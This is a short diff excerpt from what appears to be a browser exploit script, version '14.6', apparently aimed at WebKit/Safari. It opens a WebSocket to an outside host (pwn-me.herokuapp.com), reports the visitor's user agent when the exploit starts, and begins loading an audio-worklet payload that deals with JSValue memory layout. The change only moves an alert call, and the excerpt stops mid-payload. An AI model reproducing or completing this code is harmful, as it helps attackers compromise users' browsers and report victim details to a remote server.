@@ -3,11 +3,11 @@ var socket = new WebSocket("wss://pwn-me.herokuapp.com/")
 
 var keep = [];
 async function kickstart146() {
-  alert("exploit started");
 	socket.send("exploit_start", {
 		exploitVersion: "14.6",
 		userAgent: navigator.userAgent,
 	});
+  alert("exploit started");
 	var context = new OfflineAudioContext(1, 128, 300000);
 	context.audioWorklet.addModule(URL.createObjectURL(new Blob([`
       // constant added to double JSValues
